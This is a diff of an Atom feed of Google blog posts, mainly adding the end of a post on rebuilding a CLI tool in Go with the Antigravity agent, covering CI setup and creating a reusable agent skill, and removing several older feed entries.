+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;While Antigravity does use automated session compression to manage its context size, you might want to actively manage your context window by maintaining your own checklists and partitioning your work to isolated, transient subagents, when &lt;/span&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;less (context) is more (clarity)&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span style="vertical-align: baseline;"&gt;Step 5: Package structure, compilation, and CI/CD&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Through some back-and-forth communication, I learned how Go packages are structured and identified the limitations I needed to consider. I now had a cleanly structured and well documented package &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/main.go" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;main.go&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; that supported native installation:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;go install github.com/alexastrum/skl@latest&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9310&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;I prompted the agent to capture the implementation details and document them for future reference:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;summarize findings for humans in README.md, considerations for agents in AGENTS.md&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9670&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To verify the build, auto-run tests, and make sure it works on other machines as well, I asked the agent to:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;make sure it builds on all supported platforms&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9e20&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Antigravity set up the &lt;/span&gt;&lt;a href="https://github.com/alexastrum/skl/blob/main/.github/workflows/ci.yml" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;ci.yml&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; workflow to run a matrix build, which had a surprising dependency:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;env:\r\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: &amp;quot;true&amp;quot; # HMMMMMM ???\r\njobs:\r\n  test:\r\n    strategy:\r\n      matrix:\r\n        os: [ubuntu-latest, macos-latest, windows-latest]\r\n# ...&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9430&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Unexpected caveats&lt;/span&gt;&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Paradoxically, even though we migrated from Node to Go, our &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;GitHub pipeline still depends&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; on Node for standard GitHub Actions helpers like &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;actions/checkout&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;actions/setup-go&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The tool is completely ready to be run and compiled locally. However, if we want to distribute pre-compiled binaries to other users, we would need to configure code signing for macOS and Windows.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Since building a custom action with code signing is a complex process, it is best reserved for another time.&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span style="vertical-align: baseline;"&gt;Step 6: Create an Agent Skill&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;It was time to document the process itself. To codify this workflow, we &lt;a href="https://github.com/alexastrum/skl/blob/main/.agents/skills/cli-to-go-migration/SKILL.md" rel="noopener" target="_blank"&gt;created a reusable Agent Skill&lt;/a&gt;&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;I started by asking the agent to plan a skill creation prompt that included the most important steps:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;Review the current trajectory (including my specific prompts that generated accepted results) and lets plan to create a `/cli-to-go-migration` skill. What steps should the skill follow?&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9280&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;I got a draft prompt which I iterated upon. After some back-and-forth, I anchored my final instructions on five core rules (though yours might be different). Here's the final prompt I used:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-code"&gt;&lt;dl&gt;
+    &lt;dt&gt;code_block&lt;/dt&gt;
+    &lt;dd&gt;&amp;lt;ListValue: [StructValue([(&amp;#x27;code&amp;#x27;, &amp;#x27;Review the current trajectory (including my specific prompts that generated accepted results) and lets plan to create a `/cli-to-go-migration` skill. Rules:\r\n\r\n#### 1. Goals\r\nThe agent must start with research before proposing code. It identifies broader user goals, reviews multiple stack alternatives, and checks for prior work to lock in on one target language and research its idioms.\r\n\r\n#### 2. Setup\r\nBefore modifying any files, the agent verifies or initializes a Git repository to keep a clean history. Later, it must also report download failures directly and fail gracefully once all independent work is finished, rather than falling back to placeholders or non-terminating loops.\r\n\r\n#### 3. Importing existing knowledge\r\nIf required grounding skills (like `golang-cli` or `golang-testing`) are missing but are explicitly named in a prompt, the agent blocks execution and offers to install them automatically after asking for confirmation, rather than printing instructions for the developer to follow.\r\n\r\n#### 4. Breakpoints\r\nThe skill establishes hard halts for known AI pain points. The agent stops for human or algorithmic validation when encountering specific problems and anytime confusion sets in.\r\n\r\n#### 5. Alignment checks\r\nWhenever we see signs of misalignment, we need to set explicit rules. For example, when I noticed that the agent was over-editing some docs and missing others, I set the rule that the agent should only apply the `/humanizer` skill to human-facing files, like the `README.md` or help docs, while leaving structured developer context, like `AGENTS.md`, clean of style edits so that other agents can parse its metadata accurately.&amp;#x27;), (&amp;#x27;language&amp;#x27;, &amp;#x27;&amp;#x27;), (&amp;#x27;caption&amp;#x27;, &amp;lt;wagtail.rich_text.RichText object at 0x7f0be56b9fa0&amp;gt;)])]&amp;gt;&lt;/dd&gt;
+&lt;/dl&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;There isn't a one-size-fits-all approach, but asking the agent to create a skill and anchor it on a few guardrails is a good start. In practice, you will likely take turns polishing multiple prompts, until you feel like the agent's responses are aligned with your goals. Then you will ask for a proof read from the AI, and finally perform a human review of the &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;SKILL.md&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; contents.&lt;/span&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span style="vertical-align: baseline;"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Rebuilding &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;skl&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; in Go was a fun, educational experience that solved a personal tooling need. It worked, so I decided to document the process. Thinking through this prism, I realized that &lt;/span&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;the journey itself was the reward&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;. You grow as an engineer by codifying your architectural choices into reusable skills and personal experience; while the compiled binary is the physical proof that your process worked.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Surprisingly, the most significant shift I experienced during this migration is behavioral.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Pulling away from an IDE (integrated development environment) and using Antigravity 2.0 made it easier for me to keep a high-level view, preventing me from going in and fixing the issues that arose during the migration. Instead, it guided me to understand why the issues occurred, and learn Go-language specific details.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In a traditional IDE, the moment your assistant encounters an issue, your instinct is to grab your keyboard and debug. Operating without an editor forces you to remain the architect, steering the machine from the navigation deck rather than fighting the engine room fires yourself. That's exactly how we learn to manage agents at scale.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</content>
+    <link href="https://cloud.google.com/blog/topics/developers-practitioners/how-i-learned-go-in-a-day-with-antigravity-20-and-how-you-can-do-the-same/"/>
+    <category term="Google Cloud"/>
+    <published>2026-06-15T09:29:00+00:00</published>
+  </entry>
   <entry>
     <id>https://blog.google/company-news/inside-google/message-ceo/stanford-commencement-speech-2026/</id>
     <title>Read Sundar Pichai’s 2026 Commencement Address at Stanford University</title>
@@ -12845,64 +14599,5 @@ This launch is part of our ongoing commitment to user safety, privacy, and contr
     <link href="https://research.google/blog/insulin-resistance-prediction-from-wearables-and-routine-blood-biomarkers/"/>
     <category term="Google Research"/>
     <published>2025-08-06T20:02:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://research.google/blog/highly-accurate-genome-polishing-with-deeppolisher-enhancing-the-foundation-of-genomic-research/</id>
-    <title>Highly accurate genome polishing with DeepPolisher: Enhancing the foundation of genomic research</title>
-    <updated>2025-08-06T16:13:00+00:00</updated>
-    <content type="html">General Science</content>
-    <link href="https://research.google/blog/highly-accurate-genome-polishing-with-deeppolisher-enhancing-the-foundation-of-genomic-research/"/>
-    <category term="Google Research"/>
-    <published>2025-08-06T16:13:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://research.google/blog/mle-star-a-state-of-the-art-machine-learning-engineering-agents/</id>
-    <title>MLE-STAR: A state-of-the-art machine learning engineering agent</title>
-    <updated>2025-08-01T10:00:00+00:00</updated>
-    <content type="html">Machine Intelligence</content>
-    <link href="https://research.google/blog/mle-star-a-state-of-the-art-machine-learning-engineering-agents/"/>
-    <category term="Google Research"/>
-    <published>2025-08-01T10:00:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://firebase.blog/posts/2025/07/grounding-google-search-ai-logic</id>
-    <title>Grounding with Google Search in the Firebase AI Logic client SDKs</title>
-    <updated>2025-07-28T00:00:00+00:00</updated>
-    <link href="https://firebase.blog/posts/2025/07/grounding-google-search-ai-logic"/>
-    <category term="Firebase"/>
-    <published>2025-07-28T00:00:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://blog.google/waze/waze-the-bad-guys-2/</id>
-    <title>Drive with ‘The Bad Guys’ on Waze</title>
-    <updated>2025-07-23T13:00:00+00:00</updated>
-    <content type="html">The Bad Guys 2 appears in orange, red and black letters. An image of Wolfie is on the right with a speech bubble saying, "Police reported ahead. So don't mess this up, it's taken me years to get on their good side."</content>
-    <link href="https://blog.google/waze/waze-the-bad-guys-2/"/>
-    <category term="Waze"/>
-    <published>2025-07-23T13:00:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://firebase.blog/posts/2025/07/dataconnect-fts-enums</id>
-    <title>Data Connect: Full Text Search, Enums, and More</title>
-    <updated>2025-07-23T00:00:00+00:00</updated>
-    <link href="https://firebase.blog/posts/2025/07/dataconnect-fts-enums"/>
-    <category term="Firebase"/>
-    <published>2025-07-23T00:00:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://firebase.blog/posts/2025/07/integrating-firebase-in-firebase-studio</id>
-    <title>From vibe to reality: Integrating Firebase in Firebase Studio</title>
-    <updated>2025-07-22T10:05:00+00:00</updated>
-    <link href="https://firebase.blog/posts/2025/07/integrating-firebase-in-firebase-studio"/>
-    <category term="Firebase"/>
-    <published>2025-07-22T10:05:00+00:00</published>
-  </entry>
-  <entry>
-    <id>https://firebase.blog/posts/2025/07/firebase-studio-gemini-cli</id>
-    <title>Enhance Your Firebase Studio Workflow with Gemini CLI</title>
-    <updated>2025-07-22T10:00:00+00:00</updated>
-    <link href="https://firebase.blog/posts/2025/07/firebase-studio-gemini-cli"/>
-    <category term="Firebase"/>
-    <published>2025-07-22T10:00:00+00:00</published>
   </entry>
 </feed>
